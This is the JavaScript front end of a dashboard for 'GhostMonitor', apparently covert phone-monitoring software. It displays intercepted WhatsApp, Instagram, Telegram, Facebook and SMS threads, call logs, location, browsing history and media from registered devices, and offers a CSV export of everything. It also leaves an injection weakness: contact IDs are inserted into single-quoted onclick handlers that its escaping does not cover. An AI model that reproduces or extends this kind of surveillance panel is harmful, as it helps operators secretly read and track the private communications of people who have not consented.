// ── API base — same origin (Express serves both frontend and API) ─────────────
const API = '';

let autoRefreshTimer = null;
let ws = null;

document.addEventListener('DOMContentLoaded', function () {
    // Redirect to login if not authenticated
    fetch(`${API}/api/auth/check`).then(r => r.json()).then(d => {
        if (!d.logged_in) location.href = '/login.html';
    });

    initNavigation();
    initMobileMenu();
    loadLicenseStatus();
    loadOverviewData();
    initWebSocket();

    // Auto-refresh active section every 15 seconds
    autoRefreshTimer = setInterval(() => {
        const active = document.querySelector('.section.active')?.id;
        if (active) loadSectionData(active);
    }, 15000);
});

// ── WebSocket — real-time device status ──────────────────────────────────────
function initWebSocket() {
    const proto = location.protocol === 'https:' ? 'wss' : 'ws';
    ws = new WebSocket(`${proto}://${location.host}`);

    ws.onopen = () => {
        console.log('[WS] Connected');
        // Subscribe using the logged-in email (fetched from session check)
        fetch(`${API}/api/auth/check`).then(r => r.json()).then(d => {
            if (d.email) ws.send(JSON.stringify({ type: 'subscribe', email: d.email }));
        });
    };

    ws.onmessage = (e) => {
        try {
            const msg = JSON.parse(e.data);
            if (msg.type === 'device_status') {
                updateDeviceDot(msg.deviceId, msg.status);
            }
        } catch {}
    };

    ws.onclose = () => {
        console.log('[WS] Disconnected — reconnecting in 5s');
        setTimeout(initWebSocket, 5000);
    };
}

function updateDeviceDot(deviceId, status) {
    const el = document.querySelector(`[data-device-id="${deviceId}"] .status-dot`);
    if (!el) return;
    el.style.background = status === 'online' ? '#10D98A' : '#5A5670';
    el.style.boxShadow  = status === 'online' ? '0 0 8px #10D98A' : 'none';
    el.closest('[data-device-id]').querySelector('.status-label').textContent = status.toUpperCase();
}

function initNavigation() {
    document.querySelectorAll('nav a').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            switchSection(link.dataset.section);
            closeMobileMenu();
        });
    });
}

function initMobileMenu() {
    document.getElementById('menuToggle')?.addEventListener('click', (e) => {
        e.stopPropagation();
        toggleMobileMenu();
    });
}

function toggleMobileMenu() {
    document.getElementById('sidebar')?.classList.toggle('active');
    document.body.classList.toggle('menu-open');
    document.querySelector('.sidebar-overlay')?.classList.toggle('active');
}

function closeMobileMenu() {
    document.getElementById('sidebar')?.classList.remove('active');
    document.body.classList.remove('menu-open');
    document.querySelector('.sidebar-overlay')?.classList.remove('active');
}

function switchSection(section) {
    closeMobileMenu();
    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
    document.querySelectorAll('nav a').forEach(a => a.classList.remove('active'));
    document.getElementById(section)?.classList.add('active');
    document.querySelector(`[data-section="${section}"]`)?.classList.add('active');
    loadSectionData(section);
}

function loadSectionData(section) {
    switch (section) {
        case 'overview':  loadOverviewData();        break;
        case 'whatsapp':  loadContacts('whatsapp');  break;
        case 'instagram': loadContacts('instagram'); break;
        case 'telegram':  loadContacts('telegram');  break;
        case 'facebook':  loadContacts('facebook');  break;
        case 'sms':       loadContacts('sms');       break;
        case 'calls':     loadCalls();               break;
        case 'location':  initMap();                 break;
        case 'browsing':  loadBrowsing();            break;
        case 'media':     loadMedia();               break;
    }
}

async function loadLicenseStatus() {
    try {
        const data = await apiFetch('/api/license');
        const el = document.getElementById('licenseStatus');
        if (!el) return;
        el.textContent = data.status;
        el.style.color = data.status === 'Active' ? '#10b981' : '#ef4444';
        const dr = document.getElementById('days-remaining');
        if (dr) dr.textContent = data.days_remaining ?? 0;
    } catch (e) { console.error('License check failed:', e); }
}

async function loadOverviewData() {
    try {
        const data = await apiFetch('/api/data?type=overview');
        setText('total-messages',   data.total_messages   ?? 0);
        setText('total-calls',      data.total_calls      ?? 0);
        setText('location-updates', data.location_updates ?? 0);
        setText('total-time',       data.total_time       ?? '—');

        const statusEl = document.getElementById('device-status-list');
        if (statusEl) {
            const devices = data.devices ?? [];
            if (!devices.length) {
                statusEl.innerHTML = '<div style="color:var(--muted);font-size:0.8rem">No devices registered yet</div>';
            } else {
                statusEl.innerHTML = devices.map(d => `
                    <div data-device-id="${escHtml(d.device_id)}" style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
                        <div class="status-dot" style="width:10px;height:10px;border-radius:50%;flex-shrink:0;
                            background:${d.status==='online'?'#10D98A':'#5A5670'};
                            box-shadow:${d.status==='online'?'0 0 8px #10D98A':'none'}"></div>
                        <span style="font-size:0.82rem;color:var(--text2)">${escHtml(d.device_id.substring(0,20))}...</span>
                        <span class="status-label" style="font-size:0.75rem;color:var(--muted);margin-left:auto">${d.status.toUpperCase()}</span>
                    </div>`).join('');
            }
        }

        if (typeof initCharts === 'function') initCharts(data);
    } catch (e) { console.error('Overview load failed:', e); }
}

async function loadContacts(app) {
    const container = document.getElementById(`${app}-contacts`);
    if (!container) return;
    const search = document.getElementById(`${app}-search`)?.value ?? '';
    container.innerHTML = '<div class="loading-card">Loading...</div>';
    try {
        const data = await apiFetch(`/api/data?type=${app}&search=${encodeURIComponent(search)}`);
        const contacts = data.contacts ?? [];
        if (!contacts.length) { container.innerHTML = '<div class="loading-card">No data yet.</div>'; return; }
        container.innerHTML = contacts.map(c => `
            <div class="contact-item" onclick="loadThread('${app}','${escHtml(c.contact_id)}',this)">
                <div class="contact-header">
                    <strong>${escHtml(c.contact_name || c.contact_id)}</strong>
                    <span>${c.message_count} msgs · ${c.last_message_time ?? ''}</span>
                </div>
                <div style="font-size:0.82rem;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis">
                    ${escHtml((c.last_message ?? '').substring(0, 80))}
                </div>
                <div class="contact-messages" style="display:none"></div>
            </div>`).join('');
    } catch (e) { container.innerHTML = '<div class="loading-card">Failed to load.</div>'; console.error(e); }
}

async function loadThread(app, contactId, el) {
    const threadEl = el.querySelector('.contact-messages');
    if (!threadEl) return;
    if (threadEl.style.display !== 'none' && threadEl.innerHTML) { threadEl.style.display = 'none'; return; }
    threadEl.style.display = 'grid';
    threadEl.innerHTML = '<div class="loading-card" style="padding:0.5rem">Loading messages...</div>';
    try {
        const data = await apiFetch(`/api/data?type=${app}&action=thread&contact_id=${encodeURIComponent(contactId)}`);
        const msgs = data.messages ?? [];
        if (!msgs.length) { threadEl.innerHTML = '<div style="color:var(--muted);font-size:0.8rem;padding:0.5rem">No messages.</div>'; return; }
        threadEl.innerHTML = msgs.map(m => `
            <div class="message ${m.direction==='SENT'?'sent':'received'}">
                <div>${escHtml(m.content ?? '')}</div>
                <div style="font-size:0.7rem;opacity:0.6;margin-top:2px">${m.datetime ?? ''}</div>
            </div>`).join('');
        threadEl.scrollTop = threadEl.scrollHeight;
    } catch { threadEl.innerHTML = '<div style="color:var(--muted);font-size:0.8rem;padding:0.5rem">Failed.</div>'; }
}

async function loadCalls() {
    const container = document.getElementById('calls-list');
    if (!container) return;
    const start = document.getElementById('calls-start')?.value;
    const end   = document.getElementById('calls-end')?.value;
    const params = new URLSearchParams({ type: 'calls' });
    if (start) params.set('start', start);
    if (end)   params.set('end', end);
    container.innerHTML = '<div class="loading-card">Loading calls...</div>';
    try {
        const data = await apiFetch(`/api/data?${params}`);
        const calls = data.calls ?? [];
        if (!calls.length) { container.innerHTML = '<div class="loading-card">No calls found.</div>'; return; }
        container.innerHTML = calls.map(c => `
            <div class="contact-item">
                <div class="contact-header">
                    <strong>${escHtml(c.contact_name || c.contact_id)}</strong>
                    <span>${c.direction} · ${c.datetime ?? ''}</span>
                </div>
                <div style="font-size:0.82rem;color:var(--muted)">${escHtml(c.content ?? '')}</div>
            </div>`).join('');
    } catch { container.innerHTML = '<div class="loading-card">Failed to load.</div>'; }
}

async function loadBrowsing() {
    const container = document.getElementById('browsing-history');
    if (!container) return;
    const filter = document.getElementById('browsing-filter')?.value ?? 'today';
    container.innerHTML = '<div class="loading-card">Loading...</div>';
    try {
        const data = await apiFetch(`/api/data?type=browsing&filter=${filter}`);
        const history = data.history ?? [];
        if (!history.length) { container.innerHTML = '<div class="loading-card">No browsing data.</div>'; return; }
        container.innerHTML = history.map(h => `
            <div class="contact-item">
                <div class="contact-header">
                    <strong>${escHtml(h.title ?? h.url ?? '')}</strong>
                    <span>${h.datetime ?? ''}</span>
                </div>
                <div style="font-size:0.8rem;color:var(--muted);word-break:break-all">${escHtml(h.url ?? '')}</div>
            </div>`).join('');
    } catch { container.innerHTML = '<div class="loading-card">Failed to load.</div>'; }
}

async function loadMedia() {
    const container = document.getElementById('media-grid');
    if (!container) return;
    container.innerHTML = '<div class="loading-card">Loading media...</div>';
    try {
        const data = await apiFetch('/api/data?type=media');
        const media = data.media ?? [];
        if (!media.length) { container.innerHTML = '<div class="loading-card">No media found.</div>'; return; }
        container.innerHTML = media.map(m => {
            const meta = m.media_meta ? JSON.parse(m.media_meta) : {};
            return `<div class="contact-item" style="text-align:center">
                <div style="font-size:2rem">📎</div>
                <div style="font-size:0.8rem;margin-top:0.4rem">${escHtml(m.app_type)}</div>
                <div style="font-size:0.75rem;color:var(--muted)">${m.datetime ?? ''}</div>
                ${meta.size ? `<div style="font-size:0.7rem;color:var(--muted)">${(meta.size/1024).toFixed(1)} KB</div>` : ''}
            </div>`;
        }).join('');
    } catch { container.innerHTML = '<div class="loading-card">Failed to load.</div>'; }
}

async function downloadAllData() {
    try {
        const res  = await fetch(`${API}/api/data?action=export`);
        const blob = await res.blob();
        const url  = URL.createObjectURL(blob);
        const a    = document.createElement('a');
        a.href = url; a.download = `ghostmonitor_${new Date().toISOString().slice(0,10)}.csv`;
        document.body.appendChild(a); a.click(); document.body.removeChild(a);
        URL.revokeObjectURL(url);
    } catch { alert('Download failed'); }
}

function logout() {
    if (confirm('Logout from GhostMonitor?')) {
        fetch(`${API}/api/auth/logout`).then(() => location.href = '/login.html');
    }
}

// ── Helpers ───────────────────────────────────────────────────────────────────
async function apiFetch(url) {
    const res = await fetch(`${API}${url}`);
    if (res.status === 401) { location.href = '/login.html'; throw new Error('Unauthorized'); }
    return res.json();
}

function setText(id, val) {
    const el = document.getElementById(id);
    if (el) el.textContent = val;
}

function escHtml(str) {
    return String(str ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

// Search debounce
document.addEventListener('DOMContentLoaded', () => {
    ['whatsapp','instagram','telegram','facebook','sms'].forEach(app => {
        const input = document.getElementById(`${app}-search`);
        if (input) {
            let t;
            input.addEventListener('input', () => { clearTimeout(t); t = setTimeout(() => loadContacts(app), 400); });
        }
    });
});
